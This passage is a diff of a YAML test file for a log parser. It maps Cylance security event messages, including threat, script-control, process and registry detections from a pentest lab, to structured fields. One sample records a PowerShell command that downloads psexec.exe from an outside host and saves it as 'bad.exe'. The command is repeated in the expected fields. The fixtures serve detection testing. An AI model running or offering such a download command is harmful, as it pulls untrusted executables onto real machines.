@@ -104,66 +104,280 @@ tests:
  -
   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: OpticsCaeHttpEvent, Event Name: OpticsCaeHttpEvent, Device Name: DEVICE-W19, Zone Names: (Zone_3.x), Event Id: 41ea5ce4-6501-4c13-a7a2-80f9afec9eee, Severity: High, Description: DEVICE - Trigger on ANY http sensor event, Instigating Process Name: svchost.exe, Instigating Process Owner: NT AUTHORITY//SYSTEM, Instigating Process ImageFileSha256: 2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B, Event Timestamp: 2023-08-23T15:48:52.992Z, Event Received Timestamp: 2023-08-23T15:48:57Z, Device Last Reported Users: (RIMNET\\adminuser,Window Manager\\DWM-1,Window Manager\\DWM-2), Zone Ids: (D215191148D64DEE826768B62D64B244), Detection Rule Id: 9a82a2d3-e6b0-4177-9bac-80ba5b1ef982, Instigating Process Command Line: C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s wlidsvc, Instigating Process File Path: c:\\windows\\system32\\svchost.exe, Device Id: 744ac660-9704-4edb-a8d0-ae13a343f3bf, User Agent: Microsoft-CryptoAPI/10.0, Request Domain: ocsp.digicert.com, Request Path: /MFEwTzBNMEswSTAJBgUrDgMCGgUABBSAUQYBMq2awn1Rh6Doh%2FsBYgFV7gQUA95QNVbRTLtm8KPiGxvDl7I90VUCEAJ0LqoXyo4hxxe7H%2Fz9DKA%3D, Request Method: GET, Request Port: 80, Request Version: HTTP/1.1, Request Headers: 0, Request Length: 0, Response Status: 0, Response Headers: 0, Response Length: 0"
   result:
-    custom: {}
+    custom:
+      additional_details: ""
+      description: "DEVICE - Trigger on ANY http sensor event"
+      detection_rule_id: "9a82a2d3-e6b0-4177-9bac-80ba5b1ef982"
+      device_id: "744ac660-9704-4edb-a8d0-ae13a343f3bf"
+      device_last_reported_users:
+       - "RIMNET\\adminuser"
+       - "Window Manager\\DWM-1"
+       - "Window Manager\\DWM-2"
+      device_name: "DEVICE-W19"
+      dns:
+        question:
+          name: "ocsp.digicert.com"
+      event_id: "41ea5ce4-6501-4c13-a7a2-80f9afec9eee"
+      event_received_timestamp: "2023-08-23T15:48:57Z"
+      event_timestamp: "2023-08-23T15:48:52.992Z"
+      event_type: "OpticsCaeHttpEvent"
+      evt:
+        name: "OpticsCaeHttpEvent"
+      http:
+        useragent: "Microsoft-CryptoAPI/10.0"
+        useragent_details:
+          browser:
+            family: "Microsoft-CryptoAPI"
+            major: "10"
+            minor: "0"
+          device:
+            category: "Other"
+            family: "Other"
+          os:
+            family: "Other"
+      instigating_process_command_line: "C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s wlidsvc"
+      instigating_process_file_path: "c:\\windows\\system32\\svchost.exe"
+      instigating_process_imagefilesha256: "2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B"
+      instigating_process_name: "svchost.exe"
+      instigating_process_owner: "NT AUTHORITY//SYSTEM"
+      request_headers: "0"
+      request_length: 0
+      request_method: "GET"
+      request_path: "/MFEwTzBNMEswSTAJBgUrDgMCGgUABBSAUQYBMq2awn1Rh6Doh%2FsBYgFV7gQUA95QNVbRTLtm8KPiGxvDl7I90VUCEAJ0LqoXyo4hxxe7H%2Fz9DKA%3D"
+      request_port: "80"
+      request_version: "HTTP/1.1"
+      response_headers: "0"
+      response_length: 0
+      response_status: "0"
+      service: "detection-events"
+      severity: "High"
+      status: "critical"
+      tenant_id: "82ee77a2-76a6-4d8f-97de-231bd4d5a4f7"
+      tenant_name: "TestTenant"
+      zone_ids: "(D215191148D64DEE826768B62D64B244)"
+      zone_names: "(Zone_3.x)"
     message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: OpticsCaeHttpEvent, Event Name: OpticsCaeHttpEvent, Device Name: DEVICE-W19, Zone Names: (Zone_3.x), Event Id: 41ea5ce4-6501-4c13-a7a2-80f9afec9eee, Severity: High, Description: DEVICE - Trigger on ANY http sensor event, Instigating Process Name: svchost.exe, Instigating Process Owner: NT AUTHORITY//SYSTEM, Instigating Process ImageFileSha256: 2B105FB153B1BCD619B95028612B3A93C60B953EEF6837D3BB0099E4207AAF6B, Event Timestamp: 2023-08-23T15:48:52.992Z, Event Received Timestamp: 2023-08-23T15:48:57Z, Device Last Reported Users: (RIMNET\\adminuser,Window Manager\\DWM-1,Window Manager\\DWM-2), Zone Ids: (D215191148D64DEE826768B62D64B244), Detection Rule Id: 9a82a2d3-e6b0-4177-9bac-80ba5b1ef982, Instigating Process Command Line: C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s wlidsvc, Instigating Process File Path: c:\\windows\\system32\\svchost.exe, Device Id: 744ac660-9704-4edb-a8d0-ae13a343f3bf, User Agent: Microsoft-CryptoAPI/10.0, Request Domain: ocsp.digicert.com, Request Path: /MFEwTzBNMEswSTAJBgUrDgMCGgUABBSAUQYBMq2awn1Rh6Doh%2FsBYgFV7gQUA95QNVbRTLtm8KPiGxvDl7I90VUCEAJ0LqoXyo4hxxe7H%2Fz9DKA%3D, Request Method: GET, Request Port: 80, Request Version: HTTP/1.1, Request Headers: 0, Request Length: 0, Response Status: 0, Response Headers: 0, Response Length: 0"
+    service: "detection-events"
+    status: "critical"
     tags:
      - "source:LOGS_SOURCE"
+    timestamp: 1
  -
-  sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: OpticsCaeMemoryEvent, Event Name: OpticsCaeMemoryEvent, Device Name: SECURITYSERVER3, Zone Names: (JeffTesting,Jeff_3.0), Event Id: c4e7d4e1-8739-4996-83a3-19d9ba583882, Severity: Medium, Description: Looking for a protect memory event, Instigating Process Name: AttackTest32.exe, Instigating Process Owner: PENTEST/Administrator, Instigating Process ImageFileSha256: 2762CB5818C67BDD28DFE88FB528EF06B0C1AB5C175E2206B49C85BB8672C2EC, Event Timestamp: 2022-07-21T12:55:02.277Z, Event Received Timestamp: 2022-07-21T12:55:25Z, Device Last Reported Users: PENTEST\\Administrator, Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: edf530c6-6b0e-4be2-aeb6-d3f8001fce05, Instigating Process Command Line: AttackTest32.exe -p:8000, Instigating Process File Path: c:\\users\\administrator.pentest\\downloads\\attacktest\\attacktest32.exe, Device Id: e378dacb-9324-453a-b8c6-5a8406952195"
+  sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: OpticsCaeMemoryEvent, Event Name: OpticsCaeMemoryEvent, Device Name: SECURITYSERVER3, Zone Names: (JeffTesting,Jeff_3.0), Event Id: c4e7d4e1-8739-4996-83a3-19d9ba583882, Severity: Medium, Description: Looking for a protect memory event, Instigating Process Name: AttackTest32.exe, Instigating Process Owner: PENTEST/Administrator, Instigating Process ImageFileSha256: 2762CB5818C67BDD28DFE88FB528EF06B0C1AB5C175E2206B49C85BB8672C2EC, Event Timestamp: 2022-07-21T12:55:02.277Z, Event Received Timestamp: 2022-07-21T12:55:25Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: edf530c6-6b0e-4be2-aeb6-d3f8001fce05, Instigating Process Command Line: AttackTest32.exe -p:8000, Instigating Process File Path: c:\\users\\administrator.pentest\\downloads\\attacktest\\attacktest32.exe, Device Id: e378dacb-9324-453a-b8c6-5a8406952195"
   result:
     custom: {}
-    message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: OpticsCaeMemoryEvent, Event Name: OpticsCaeMemoryEvent, Device Name: SECURITYSERVER3, Zone Names: (JeffTesting,Jeff_3.0), Event Id: c4e7d4e1-8739-4996-83a3-19d9ba583882, Severity: Medium, Description: Looking for a protect memory event, Instigating Process Name: AttackTest32.exe, Instigating Process Owner: PENTEST/Administrator, Instigating Process ImageFileSha256: 2762CB5818C67BDD28DFE88FB528EF06B0C1AB5C175E2206B49C85BB8672C2EC, Event Timestamp: 2022-07-21T12:55:02.277Z, Event Received Timestamp: 2022-07-21T12:55:25Z, Device Last Reported Users: PENTEST\\Administrator, Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: edf530c6-6b0e-4be2-aeb6-d3f8001fce05, Instigating Process Command Line: AttackTest32.exe -p:8000, Instigating Process File Path: c:\\users\\administrator.pentest\\downloads\\attacktest\\attacktest32.exe, Device Id: e378dacb-9324-453a-b8c6-5a8406952195"
+    message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: OpticsCaeMemoryEvent, Event Name: OpticsCaeMemoryEvent, Device Name: SECURITYSERVER3, Zone Names: (JeffTesting,Jeff_3.0), Event Id: c4e7d4e1-8739-4996-83a3-19d9ba583882, Severity: Medium, Description: Looking for a protect memory event, Instigating Process Name: AttackTest32.exe, Instigating Process Owner: PENTEST/Administrator, Instigating Process ImageFileSha256: 2762CB5818C67BDD28DFE88FB528EF06B0C1AB5C175E2206B49C85BB8672C2EC, Event Timestamp: 2022-07-21T12:55:02.277Z, Event Received Timestamp: 2022-07-21T12:55:25Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: edf530c6-6b0e-4be2-aeb6-d3f8001fce05, Instigating Process Command Line: AttackTest32.exe -p:8000, Instigating Process File Path: c:\\users\\administrator.pentest\\downloads\\attacktest\\attacktest32.exe, Device Id: e378dacb-9324-453a-b8c6-5a8406952195"
     tags:
      - "source:LOGS_SOURCE"
  -
   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: Device, Event Name: Device Updated, Device Message: Renamed: 'default' to 'Unknown', User: John Carter (john.carter@example.com), Zone Names: (Windows Zone (Default)), Device Id: 4755134a-9eb4-44d1-95f3-aa605d4443cf"
   result:
-    custom: {}
+    custom:
+      additional_details: ""
+      device_id: "4755134a-9eb4-44d1-95f3-aa605d4443cf"
+      device_name: "Unknown"
+      event_type: "Device"
+      evt:
+        name: "Device Updated"
+      previous_device: "default"
+      service: "desktop-events"
+      tenant_id: "82ee77a2-76a6-4d8f-97de-231bd4d5a4f7"
+      tenant_name: "TestTenant"
+      user: "John Carter (john.carter@example.com)"
+      zone_names: "(Windows Zone (Default))"
     message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: Device, Event Name: Device Updated, Device Message: Renamed: 'default' to 'Unknown', User: John Carter (john.carter@example.com), Zone Names: (Windows Zone (Default)), Device Id: 4755134a-9eb4-44d1-95f3-aa605d4443cf"
+    service: "desktop-events"
     tags:
      - "source:LOGS_SOURCE"
+    timestamp: 1
  -
   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: DeviceControl, Event Name: blocked, Device Name: Unknown CLW 381, External Device Type: USBDrive, External Device Vendor ID: 090S, External Device Name: USB Flash DISK USB Device, External Device Product ID: 1001, External Device Serial Number: 1408033910001649, Zone Names: (Windows Zone (Default)), Device Id: cf753b5b-6ce6-4648-b2df-a827d3560b6q, Policy Name: Stage 3 - All Threats AQT + Critical Exploit Prevention + Malicious Script Prevention (Cylance Reference Policy)"
   result:
-    custom: {}
+    custom:
+      additional_details: ""
+      device_id: "cf753b5b-6ce6-4648-b2df-a827d3560b6q"
+      device_name: "Unknown CLW 381"
+      event_type: "DeviceControl"
+      evt:
+        name: "blocked"
+      external_device_name: "USB Flash DISK USB Device"
+      external_device_product_id: "1001"
+      external_device_serial_number: "1408033910001649"
+      external_device_type: "USBDrive"
+      external_device_vendor_id: "090S"
+      policy_name: "Stage 3 - All Threats AQT + Critical Exploit Prevention + Malicious Script Prevention (Cylance Reference Policy)"
+      service: "desktop-events"
+      tenant_id: "82ee77a2-76a6-4d8f-97de-231bd4d5a4f7"
+      tenant_name: "TestTenant"
+      zone_names: "(Windows Zone (Default))"
     message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: DeviceControl, Event Name: blocked, Device Name: Unknown CLW 381, External Device Type: USBDrive, External Device Vendor ID: 090S, External Device Name: USB Flash DISK USB Device, External Device Product ID: 1001, External Device Serial Number: 1408033910001649, Zone Names: (Windows Zone (Default)), Device Id: cf753b5b-6ce6-4648-b2df-a827d3560b6q, Policy Name: Stage 3 - All Threats AQT + Critical Exploit Prevention + Malicious Script Prevention (Cylance Reference Policy)"
+    service: "desktop-events"
     tags:
      - "source:LOGS_SOURCE"
+    timestamp: 1
  -
   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: ScriptControl, Event Name: Alert, Device Name: Unknown CLW 381, File Path: c:/test/test1, SHA256: DBEDAAF4FB3BFCB676F851C981351966E096DD25138AD07EC4D1A095A6485C5K, Status: Unscored, Interpreter: PowershellScript, Interpreter Version: 10.0.22621.1 (WinBuild.160101.080k), Zone Names: (Windows Zone (Default)), User Name: fakeuser, Device Id: cf753b5b-6ce6-4648-b2df-a827d3560b6k, Policy Name: Stage 3 - All Threats AQT + Critical Exploit Prevention + Malicious Script Prevention (Cylance Reference Policy)"
   result:
-    custom: {}
+    custom:
+      additional_details: ""
+      device_id: "cf753b5b-6ce6-4648-b2df-a827d3560b6k"
+      device_name: "Unknown CLW 381"
+      event_type: "ScriptControl"
+      evt:
+        name: "Alert"
+      file_path: "c:/test/test1"
+      interpreter: "PowershellScript"
+      interpreter_version: "10.0.22621.1 (WinBuild.160101.080k)"
+      policy_name: "Stage 3 - All Threats AQT + Critical Exploit Prevention + Malicious Script Prevention (Cylance Reference Policy)"
+      script_control_status: "Unscored"
+      service: "desktop-events"
+      sha256: "DBEDAAF4FB3BFCB676F851C981351966E096DD25138AD07EC4D1A095A6485C5K"
+      tenant_id: "82ee77a2-76a6-4d8f-97de-231bd4d5a4f7"
+      tenant_name: "TestTenant"
+      user: "fakeuser"
+      zone_names: "(Windows Zone (Default))"
     message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: ScriptControl, Event Name: Alert, Device Name: Unknown CLW 381, File Path: c:/test/test1, SHA256: DBEDAAF4FB3BFCB676F851C981351966E096DD25138AD07EC4D1A095A6485C5K, Status: Unscored, Interpreter: PowershellScript, Interpreter Version: 10.0.22621.1 (WinBuild.160101.080k), Zone Names: (Windows Zone (Default)), User Name: fakeuser, Device Id: cf753b5b-6ce6-4648-b2df-a827d3560b6k, Policy Name: Stage 3 - All Threats AQT + Critical Exploit Prevention + Malicious Script Prevention (Cylance Reference Policy)"
+    service: "desktop-events"
     tags:
      - "source:LOGS_SOURCE"
+    timestamp: 1
  -
   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: Threat, Event Name: threat_changed, Device Name: Unknown (test1), IP Address: (10.0.0.0), File Name: fakefile1, Path: c:/test/test1, Drive Type: Internal Hard Drive, SHA256: D946DEEEFF734644A86D7B254AD9D69F730E2014411404696DA19DBD508711C9, MD5: E719222BD4624F1C0A92117FE33E261a, Status: Quarantined, Cylance Score: 96, Found Date: 11/18/2025 8:40:23 AM, File Type: Executable, Is Running: False, Auto Run: False, Detected By: FileWatcher, Zone Names: (Windows Zone (Default)), Is Malware: True, Is Unique To Cylance: False, Threat Classification: Malware - Trojan, Device Id: 0929f443-2a56-46b3-bcfe-fc598da81d8b, Policy Name: Stage 3 - All Threats AQT + Critical Exploit Prevention + Malicious Script Prevention (Cylance Reference Policy)"
   result:
-    custom: {}
+    custom:
+      Status: "Quarantined"
+      additional_details: ""
+      auto_run: "False"
+      cylance_score: 96
+      detected_by: "FileWatcher"
+      device_id: "0929f443-2a56-46b3-bcfe-fc598da81d8b"
+      device_name: "Unknown (test1)"
+      drive_type: "Internal Hard Drive"
+      event_type: "Threat"
+      evt:
+        name: "threat_changed"
+      file_name: "fakefile1"
+      file_path: "c:/test/test1"
+      file_state: "Unsafe"
+      file_type: "Executable"
+      found_date: "11/18/2025 8:40:23 AM"
+      ip_addresses:
+       - "10.0.0.0"
+      is_malware: "True"
+      is_running: "False"
+      is_unique_to_cylance: "False"
+      md5: "E719222BD4624F1C0A92117FE33E261a"
+      policy_name: "Stage 3 - All Threats AQT + Critical Exploit Prevention + Malicious Script Prevention (Cylance Reference Policy)"
+      service: "desktop-events"
+      sha256: "D946DEEEFF734644A86D7B254AD9D69F730E2014411404696DA19DBD508711C9"
+      tenant_id: "82ee77a2-76a6-4d8f-97de-231bd4d5a4f7"
+      tenant_name: "TestTenant"
+      threat_classification: "Malware - Trojan"
+      zone_names: "(Windows Zone (Default))"
     message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: Threat, Event Name: threat_changed, Device Name: Unknown (test1), IP Address: (10.0.0.0), File Name: fakefile1, Path: c:/test/test1, Drive Type: Internal Hard Drive, SHA256: D946DEEEFF734644A86D7B254AD9D69F730E2014411404696DA19DBD508711C9, MD5: E719222BD4624F1C0A92117FE33E261a, Status: Quarantined, Cylance Score: 96, Found Date: 11/18/2025 8:40:23 AM, File Type: Executable, Is Running: False, Auto Run: False, Detected By: FileWatcher, Zone Names: (Windows Zone (Default)), Is Malware: True, Is Unique To Cylance: False, Threat Classification: Malware - Trojan, Device Id: 0929f443-2a56-46b3-bcfe-fc598da81d8b, Policy Name: Stage 3 - All Threats AQT + Critical Exploit Prevention + Malicious Script Prevention (Cylance Reference Policy)"
+    service: "desktop-events"
     tags:
      - "source:LOGS_SOURCE"
+    timestamp: 1
  -
   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: ThreatClassification, Event Name: ThreatUpdated, Threat Class: Malware, Threat Subclass: Trojan, Threat Family: diskwriter, SHA256: 3AAB8621827F18FF282BAB5635A3AA1333989E533539A6C9B6BC891E92258149, MD5: D50E739C71C9513B306F3393762CFC85"
   result:
-    custom: {}
+    custom:
+      additional_details: ""
+      event_type: "ThreatClassification"
+      evt:
+        name: "ThreatUpdated"
+      md5: "D50E739C71C9513B306F3393762CFC85"
+      service: "desktop-events"
+      sha256: "3AAB8621827F18FF282BAB5635A3AA1333989E533539A6C9B6BC891E92258149"
+      tenant_id: "82ee77a2-76a6-4d8f-97de-231bd4d5a4f7"
+      tenant_name: "TestTenant"
+      threat_class: "Malware"
+      threat_family: "diskwriter"
+      threat_subclass: "Trojan"
     message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: ThreatClassification, Event Name: ThreatUpdated, Threat Class: Malware, Threat Subclass: Trojan, Threat Family: diskwriter, SHA256: 3AAB8621827F18FF282BAB5635A3AA1333989E533539A6C9B6BC891E92258149, MD5: D50E739C71C9513B306F3393762CFC85"
+    service: "desktop-events"
     tags:
      - "source:LOGS_SOURCE"
+    timestamp: 1
  -
   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: OpticsCaeProcessEvent, Event Name: OpticsCaeProcessEvent, Device Name: SECURITYSERVER2, Zone Names: (Jeff Test), Event Id: dbe47fda-f37b-42cc-a308-9675feb7e36a, Severity: High, Description: Jeffs Take 2 Powershell Download, Instigating Process Name: cmd.exe, Instigating Process Owner: PENTEST//Administrator, Instigating Process ImageFileSha256: 935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2, Event Timestamp: 2022-06-23T12:54:15.811Z, Event Received Timestamp: 2022-06-23T12:54:41Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (39BFDA7FEF71490584AAB4F163142350), Detection Rule Id: 3f110342-88f8-11ec-a8a3-0242ac120002, Instigating Process Command Line: \"C:\\Windows\\system32\\cmd.exe\" , Instigating Process File Path: c:\\windows\\system32\\cmd.exe, Target Process Name: powershell.exe, Target Process Owner: PENTEST//Administrator, Target Process ImageFileSha256: BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436, Device Id: 3514593e-7405-4319-8ca5-8ec876bf0195, Target Process Command Line: powershell -command \"(new-object SYstem.Net.WebClient).DownloadFile('https://zaphod.cnerds.net/infection/psexec.exe', 'C:\\dver\\bad.exe')\", Target Process File Path: c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"
   result:
-    custom: {}
+    custom:
+      additional_details: ""
+      description: "Jeffs Take 2 Powershell Download"
+      detection_rule_id: "3f110342-88f8-11ec-a8a3-0242ac120002"
+      device_id: "3514593e-7405-4319-8ca5-8ec876bf0195"
+      device_last_reported_users:
+       - "PENTEST\\Administrator"
+      device_name: "SECURITYSERVER2"
+      event_id: "dbe47fda-f37b-42cc-a308-9675feb7e36a"
+      event_received_timestamp: "2022-06-23T12:54:41Z"
+      event_timestamp: "2022-06-23T12:54:15.811Z"
+      event_type: "OpticsCaeProcessEvent"
+      evt:
+        name: "OpticsCaeProcessEvent"
+      instigating_process_command_line: "\"C:\\Windows\\system32\\cmd.exe\" "
+      instigating_process_file_path: "c:\\windows\\system32\\cmd.exe"
+      instigating_process_imagefilesha256: "935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2"
+      instigating_process_name: "cmd.exe"
+      instigating_process_owner: "PENTEST//Administrator"
+      service: "detection-events"
+      severity: "High"
+      status: "critical"
+      target_process_command_line: "powershell -command \"(new-object SYstem.Net.WebClient).DownloadFile('https://zaphod.cnerds.net/infection/psexec.exe', 'C:\\dver\\bad.exe')\""
+      target_process_file_path: "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"
+      target_process_imagefilesha256: "BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436"
+      target_process_name: "powershell.exe"
+      target_process_owner: "PENTEST//Administrator"
+      tenant_id: "82ee77a2-76a6-4d8f-97de-231bd4d5a4f7"
+      tenant_name: "TestTenant"
+      zone_ids: "(39BFDA7FEF71490584AAB4F163142350)"
+      zone_names: "(Jeff Test)"
     message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: OpticsCaeProcessEvent, Event Name: OpticsCaeProcessEvent, Device Name: SECURITYSERVER2, Zone Names: (Jeff Test), Event Id: dbe47fda-f37b-42cc-a308-9675feb7e36a, Severity: High, Description: Jeffs Take 2 Powershell Download, Instigating Process Name: cmd.exe, Instigating Process Owner: PENTEST//Administrator, Instigating Process ImageFileSha256: 935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2, Event Timestamp: 2022-06-23T12:54:15.811Z, Event Received Timestamp: 2022-06-23T12:54:41Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (39BFDA7FEF71490584AAB4F163142350), Detection Rule Id: 3f110342-88f8-11ec-a8a3-0242ac120002, Instigating Process Command Line: \"C:\\Windows\\system32\\cmd.exe\" , Instigating Process File Path: c:\\windows\\system32\\cmd.exe, Target Process Name: powershell.exe, Target Process Owner: PENTEST//Administrator, Target Process ImageFileSha256: BA4038FD20E474C047BE8AAD5BFACDB1BFC1DDBE12F803F473B7918D8D819436, Device Id: 3514593e-7405-4319-8ca5-8ec876bf0195, Target Process Command Line: powershell -command \"(new-object SYstem.Net.WebClient).DownloadFile('https://zaphod.cnerds.net/infection/psexec.exe', 'C:\\dver\\bad.exe')\", Target Process File Path: c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"
+    service: "detection-events"
+    status: "critical"
     tags:
      - "source:LOGS_SOURCE"
+    timestamp: 1
  -
   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: OpticsCaeFileEvent, Event Name: OpticsCaeFileEvent, Device Name: SECURITYSERVER3, Zone Names: (JeffTesting,JeffSecurityServer), Event Id: f4739af7-9c8b-4dc0-aeb7-2d4533445d49, Severity: Medium, Description: SYSLOG detections - Looking for a created file cylancetest.txt, Instigating Process Name: cmd.exe, Instigating Process Owner: PENTEST//Administrator, Instigating Process ImageFileSha256: BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527, Event Timestamp: 2022-06-28T18:09:32.693Z, Event Received Timestamp: 2022-06-28T18:09:36Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: 74bd0e7e-281a-4d7b-9f84-d0f51346782c, Instigating Process Command Line: \"C:\\Windows\\system32\\cmd.exe\" , Instigating Process File Path: c:\\windows\\system32\\cmd.exe, Target File Path: c:\\users\\administrator.pentest\\downloads\\syslog_test_cae_rules\\cylancetest.txt, Target File Owner: BUILTIN//Administrators, Target File Sha256: ueirjftkgpokfjrkjfmlrmf, Device Id: c7b79f9f-4fbe-4f90-9658-ec7e17af1954"
   result:
-    custom: {}
+    custom:
+      additional_details: ""
+      description: "SYSLOG detections - Looking for a created file cylancetest.txt"
+      detection_rule_id: "74bd0e7e-281a-4d7b-9f84-d0f51346782c"
+      device_id: "c7b79f9f-4fbe-4f90-9658-ec7e17af1954"
+      device_last_reported_users:
+       - "PENTEST\\Administrator"
+      device_name: "SECURITYSERVER3"
+      event_id: "f4739af7-9c8b-4dc0-aeb7-2d4533445d49"
+      event_received_timestamp: "2022-06-28T18:09:36Z"
+      event_timestamp: "2022-06-28T18:09:32.693Z"
+      event_type: "OpticsCaeFileEvent"
+      evt:
+        name: "OpticsCaeFileEvent"
+      instigating_process_command_line: "\"C:\\Windows\\system32\\cmd.exe\" "
+      instigating_process_file_path: "c:\\windows\\system32\\cmd.exe"
+      instigating_process_imagefilesha256: "BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527"
+      instigating_process_name: "cmd.exe"
+      instigating_process_owner: "PENTEST//Administrator"
+      service: "detection-events"
+      severity: "Medium"
+      status: "warning"
+      target_file_owner: "BUILTIN//Administrators"
+      target_file_path: "c:\\users\\administrator.pentest\\downloads\\syslog_test_cae_rules\\cylancetest.txt"
+      target_process_imagefilesha256: "ueirjftkgpokfjrkjfmlrmf"
+      tenant_id: "82ee77a2-76a6-4d8f-97de-231bd4d5a4f7"
+      tenant_name: "TestTenant"
+      zone_ids: "(F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA)"
+      zone_names: "(JeffTesting,JeffSecurityServer)"
     message: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: OpticsCaeFileEvent, Event Name: OpticsCaeFileEvent, Device Name: SECURITYSERVER3, Zone Names: (JeffTesting,JeffSecurityServer), Event Id: f4739af7-9c8b-4dc0-aeb7-2d4533445d49, Severity: Medium, Description: SYSLOG detections - Looking for a created file cylancetest.txt, Instigating Process Name: cmd.exe, Instigating Process Owner: PENTEST//Administrator, Instigating Process ImageFileSha256: BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527, Event Timestamp: 2022-06-28T18:09:32.693Z, Event Received Timestamp: 2022-06-28T18:09:36Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: 74bd0e7e-281a-4d7b-9f84-d0f51346782c, Instigating Process Command Line: \"C:\\Windows\\system32\\cmd.exe\" , Instigating Process File Path: c:\\windows\\system32\\cmd.exe, Target File Path: c:\\users\\administrator.pentest\\downloads\\syslog_test_cae_rules\\cylancetest.txt, Target File Owner: BUILTIN//Administrators, Target File Sha256: ueirjftkgpokfjrkjfmlrmf, Device Id: c7b79f9f-4fbe-4f90-9658-ec7e17af1954"
+    service: "detection-events"
+    status: "warn"
     tags:
      - "source:LOGS_SOURCE"
+    timestamp: 1
  -
   sample: "Tenant ID: 82ee77a2-76a6-4d8f-97de-231bd4d5a4f7, Tenant Name: TestTenant, Event Type: OpticsCaeRegistryEvent, Event Name: OpticsCaeRegistryEvent, Device Name: SECURITYSERVER3, Zone Names: (JeffTesting,JeffSecurityServer), Event Id: 6d33d636-dcdc-48c2-911a-ead99ac17f88, Severity: Medium, Description: SYSLOG detections - RegistryKey \\software\\classes\\*\\shellex\\contextmenuhandlers\\cywareshlext, Instigating Process Name: ICreatePersistencePoints.exe, Instigating Process Owner: PENTEST//Administrator, Instigating Process ImageFileSha256: F83926AB855E860C9B1A6D72EB6024D9E1D569A59E4901A62E8543B1C978D5E5, Event Timestamp: 2022-06-28T18:08:49.103Z, Event Received Timestamp: 2022-06-28T18:08:54Z, Device Last Reported Users: (PENTEST\\Administrator), Zone Ids: (F568A8A8E401470282C1FE98FDD1703C,161EB91D79D6466A80182CF685FA7CAA), Detection Rule Id: 74354415-7d28-4f31-830d-72a14c0c3d8b, Instigating Process Command Line: ICreatePersistencePoints.exe --trigger 0, Instigating Process File Path: c:\\users\\administrator.pentest\\downloads\\syslog_test_cae_rules\\icreatepersistencepoints.exe, Target Registry KeyPath: HKLM\\software\\classes\\*\\shellex\\contextmenuhandlers\\cywareshlext, Target Registry ValueName: Unknown, Device 